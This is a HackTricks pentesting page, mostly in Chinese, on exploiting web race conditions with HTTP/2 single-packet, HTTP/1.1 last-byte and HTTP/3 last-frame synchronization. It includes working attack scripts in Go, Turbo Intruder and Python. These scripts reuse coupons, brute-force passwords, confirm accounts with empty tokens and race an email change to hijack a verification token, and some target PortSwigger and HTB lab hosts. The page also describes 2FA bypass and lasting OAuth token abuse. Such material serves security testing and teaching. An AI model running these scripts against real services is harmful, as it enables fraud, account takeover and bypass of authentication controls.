# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> 欲深入了解此技术，请查看原始报告： [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## 增强 Race Condition 攻击

利用 race conditions 的主要难点是确保多个请求在相同时间被处理，且它们的处理时间差非常小——理想情况下少于 **1ms**。

下面是一些用于同步请求的技巧：

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: 支持通过单个 TCP 连接发送两个请求，从而降低网络抖动的影响。然而，由于服务器端的差异，两个请求可能不足以进行一致的 race condition exploit。
- **HTTP/1.1 'Last-Byte Sync'**: 允许提前发送 20–30 个请求的大部分内容，保留一个小片段，然后一起发送，从而实现它们在服务器端的同时到达。

**Preparation for Last-Byte Sync** 包括：

1. 发送 headers 和 body 数据，但省去最后一个字节，不结束 stream。
2. 在初次发送后暂停 100ms。
3. 禁用 TCP_NODELAY 以利用 Nagle's algorithm 对最终帧进行合批。
4. 通过 ping 来预热连接。

随后一次性发送被保留的帧应导致它们以单个数据包到达，可以用 Wireshark 验证。此方法不适用于静态文件，静态文件通常不涉及 RC 攻击。

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **概念**：HTTP/3 基于 QUIC（UDP）。没有可以依赖的 TCP 合并或 Nagle，因此经典的 last‑byte sync 在现成的客户端上无法工作。相反，需要有意将多个 QUIC stream‑final DATA 帧（FIN）合并到同一 UDP 数据报中，以便服务器在相同的调度 tick 中处理所有目标请求。
- **如何实现**：使用一个专门的库来暴露 QUIC 帧控制。例如，H3SpaceX 操纵 quic-go 来实现 HTTP/3 last‑frame synchronization，适用于有 body 的请求和无 body 的 GET‑style 请求。
- Requests‑with‑body：对 N 个 streams 发送 HEADERS + DATA（省去最后一个字节），然后一起刷新每个 stream 的最后一个字节。
- GET‑style：构造伪造的 DATA 帧（或带有 Content‑Length 的微小 body），并在一个数据报中结束所有 streams。
- **实际限制**：
  - 并发数受对端的 QUIC max_streams transport parameter 限制（类似于 HTTP/2 的 SETTINGS_MAX_CONCURRENT_STREAMS）。如果该值较低，打开多个 H3 连接并在它们之间分散 race。
  - UDP 数据报大小和 path MTU 限制了你能合并多少 stream‑final 帧。该库会在需要时处理拆分到多个数据报，但单个数据报刷新最可靠。
- **实践**：有公开的 H2/H3 race 实验室和随 H3SpaceX 附带的示例 exploits。

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) 最小示例</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### 适应服务器架构

理解目标的架构至关重要。前端服务器可能以不同方式路由请求，从而影响时序。通过无关紧要的请求进行预先的服务器端连接预热，可能会使请求时序正常化。

#### 处理基于会话的锁定

像 PHP 的 session handler 这样的框架会按会话序列化请求，可能会掩盖漏洞。使用不同的 session tokens 来处理每个请求可以绕过这个问题。

#### 绕过速率或资源限制

如果连接预热无效，通过大量虚假请求故意触发 web 服务器的速率或资源限制延迟，可能会通过诱发服务器端延迟从而有利于 single-packet attack，促成 race conditions。

## 攻击示例

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: 你可以将请求发送到 **Turbo Intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`)，你可以在请求中更改你想要暴力破解的值 **`%s`**，例如 `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`，然后从下拉列表中选择 **`examples/race-single-packer-attack.py`**:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

如果你打算 **发送不同的值**，你可以用这个使用剪贴板中 wordlist 的代码来修改：
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> 如果 web 不支持 HTTP2（只有 HTTP1.1），请使用 `Engine.THREADED` 或 `Engine.BURP`，而不是 `Engine.BURP2`。

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: 如果你需要向 1 个 endpoint 发送一个请求，然后向其他多个 endpoint 发送请求以触发 RCE，你可以将 `race-single-packet-attack.py` 脚本修改为类似下面的内容：
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- 它也可以通过 Burp Suite 中的 **Repeater** 新选项 '**Send group in parallel**' 来使用。
- 对于 **limit-overrun**，你可以在组里添加 **same request 50 times**。
- 对于 **connection warming**，你可以在 **group** 的 **beginning** 添加一些对 web 服务器非静态部分的 **requests**。
- 要在两个子状态步骤中对处理 **one request and another** 之间进行 **delaying**，你可以在两个请求之间 **add extra requests between**。
- 对于 **multi-endpoint** **RC**，你可以先发送会 **goes to the hidden state** 的 **request**，然后紧接着发送 **50 requests** 来 **exploits the hidden state**。

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: 该脚本的目标是更改用户的 email，同时不断验证它，直到新的 email 的 verification token 到达最后的 email（这是因为在代码中出现了一个 RC：可以修改 email，但验证会发送到旧的 email，因为表示 email 的变量已经被最初的值填充）。\
当在收到的邮件中发现单词 "objetivo" 时，我们就知道已收到被更改 email 的验证令牌并结束攻击。
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: 引擎与门控说明

- 引擎选择：在 HTTP/2 目标上使用 `Engine.BURP2` 以触发 single‑packet attack；在 HTTP/1.1 的 last‑byte sync 场景下回退到 `Engine.THREADED` 或 `Engine.BURP`。
- `gate`/`openGate`：使用 `gate='race1'`（或按尝试划分的 gates）排队多份请求，这会暂存每个请求的尾部；调用 `openGate('race1')` 会一起刷新所有尾部，从而使它们几乎同时到达。
- 诊断：Turbo Intruder 中的负时间戳表示服务器在请求完全发送前就已响应，证明了重叠（overlap）。在真实的 race 中这是预期现象。
- 连接预热：先发一个 ping 或几次无害请求以稳定时序；可选地禁用 `TCP_NODELAY` 以鼓励对最后几个帧的批处理。

### 改进 Single Packet Attack

在原始研究中解释到该攻击受 1,500 字节的限制。然而，在 [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)，说明了如何通过使用 IP layer fragmentation（将单个包拆分为多个 IP 包）并以不同顺序发送，从而将 single packet attack 的 1,500 字节限制扩展到 TCP 的 **65,535 B 窗口限制**，允许在所有片段到达服务器之前阻止重组。该技术使研究者能在约 166ms 内发送 10,000 个请求。

注意，虽然这种改进使需要数百/数千个包同时到达的 RC 更可靠，但它也可能受一些软件限制影响。一些流行的 HTTP 服务器如 Apache、Nginx 和 Go 对 `SETTINGS_MAX_CONCURRENT_STREAMS` 有严格限制，分别为 100、128 和 250。然而，像 NodeJS 和 nghttp2 则没有限制。\
这基本意味着 Apache 只会将来自单个 TCP 连接的 100 个 HTTP connections 计入（限制了该 RC 攻击）。对于 HTTP/3，类似的限制是 QUIC 的 max_streams 传输参数 —— 若该值较小，则将你的 race 分布到多个 QUIC 连接上。

你可以在仓库中找到使用该技术的一些示例：[https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

在上述研究之前，有一些载荷只是尽可能快地发送包以触发 RC。

- **Repeater:** Check the examples from the previous section.
- **Intruder**: Send the **request** to **Intruder**, set the **number of threads** to **30** inside the **Options menu and,** select as payload **Null payloads** and generate **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

这是最基本的一类 race condition，**vulnerabilities** 会出现在对操作次数有限制的场景中。比如在网店中多次使用同一个折扣码。一个非常简单的例子可以在 [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) 或在 [**this bug**](https://hackerone.com/reports/759247)**.**

There are many variations of this kind of attack, including:

- 多次使用礼品卡
- 对产品多次评分
- 提取或转账超出账户余额
- 重复使用同一 CAPTCHA 解答
- 绕过反暴力破解的 rate limit

### **隐藏子状态**

利用复杂的 race condition 通常涉及利用短暂机会与隐藏或 **非预期的机器子状态** 交互。以下是处理思路：

1. **Identify Potential Hidden Substates**
- 从定位修改或与关键数据交互的 endpoints 开始，例如用户资料或 password reset 流程。关注：
- **Storage**：优先选择操作 server-side 持久化数据的 endpoints，而不是仅在 client-side 处理数据的。
- **Action**：寻找修改现有数据的操作，这类操作比添加新数据更可能产生可利用的条件。
- **Keying**：成功的攻击通常涉及基于相同标识符进行的操作，例如 username 或 reset token。
2. **Conduct Initial Probing**
- 使用 race condition 攻击测试已识别的 endpoints，观察是否有偏离预期结果的情况。意外的响应或应用行为变化可能表明存在 vulnerability。
3. **Demonstrate the Vulnerability**
- 将攻击缩减到利用该 vulnerability 所需的最少请求数，通常只需两次请求。由于需要精确的时序，这一步可能需要多次尝试或自动化。

### 时间敏感的攻击

精确控制请求时机可以暴露 vulnerability，尤其是在使用可预测方法（如 timestamps）生成 security tokens 时。例如，基于 timestamps 生成 password reset tokens 可能导致同时发出的请求得到相同的 token。

**利用方法：**

- 使用精确时序，例如 single packet attack，发起并发的 password reset 请求。如果生成相同的 tokens，则表明存在 vulnerability。

**示例：**

- 同时请求两个 password reset tokens 并比较它们。如果 tokens 匹配，则说明 token 生成存在缺陷。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## 隐藏子状态 案例研究

### Pay & add an Item

查看 [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) 了解如何在商店中 **支付** 并 **添加额外** 商品，从而 **无需为其付款**。

### Confirm other emails

思路是**同时验证一个邮箱地址并将其更改为另一个邮箱**，以检测平台是否会验证更改后的新邮箱。

### Change email to 2 emails addresses Cookie based

根据 [**this research**](https://portswigger.net/research/smashing-the-state-machine)，Gitlab 曾可通过这种方式被接管，因为它可能会 **将一个邮箱的 email verification token 发送给另一个邮箱**。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

如果对 **database** 的 **information** 添加涉及 **2 different writes**，会存在一小段时间内数据库中只有**第一份数据已写入**。例如，在创建用户时，可能先写入 **username** 和 **password**，然后再写入用于确认新账号的 **token**。这意味着在很短的时间内用于确认账号的 **token 是 null**。

因此，**注册账号并发送多个带空 token 的请求**（`token=` 或 `token[]=` 或任何其他变体）以立即确认该账号，可能允许**确认一个你不控制邮箱的账号**。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

下面的 pseudo-code 易受 race condition 攻击，因为在创建 session 的极短时间内 **2FA 未被强制**：
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 永久持久化

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). 这些服务允许你创建一个 application 并对 provider 已注册的用户进行认证。为此，**client** 需要 **permit your application** 来访问 **OAUth provider** 中的部分数据。\
到这里为止，这只是一个常见的使用 google/linkedin/github 等登录的流程，你会看到一个页面提示：“_Application <InsertCoolName> wants to access you information, do you want to allow it?_”

#### Race Condition in `authorization_code`

当你 **accept it** 时，问题出现了：服务会自动向恶意应用发送一个 **`authorization_code`**。然后，该 **application** 利用 OAUth 服务提供者中的 Race Condition，从该 **`authorization_code`** 为你的账户生成不止一对 AT/RT（_Authentication Token/Refresh Token_）。基本上，它会滥用你已授权应用访问数据的事实来 **create several accounts**。之后，如果你 **stop allowing the application to access your data**，一对 AT/RT 可能会被删除，但其它的仍然有效。

#### Race Condition in `Refresh Token`

一旦你 **obtained a valid RT**，攻击者可以尝试 **abuse it to generate several AT/RT**，即使用户撤销了对恶意 application 的权限，**多个 RT 仍可能保持有效。**

## **RC in WebSockets**

- 在 [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) 中，你可以找到一个用 Java 编写的 PoC，用于并行发送 websocket 消息以滥用 Web Sockets 中的 Race Conditions。
- 使用 Burp 的 WebSocket Turbo Intruder 可以使用 **THREADED** 引擎生成多个 WS 连接并并行发送 payloads。先从官方示例开始并调整 `config()`（线程数）以获得并发性；在跨 WS 处理程序竞争服务器端状态时，这通常比在单个连接上批处理更可靠。参见 [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)。

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
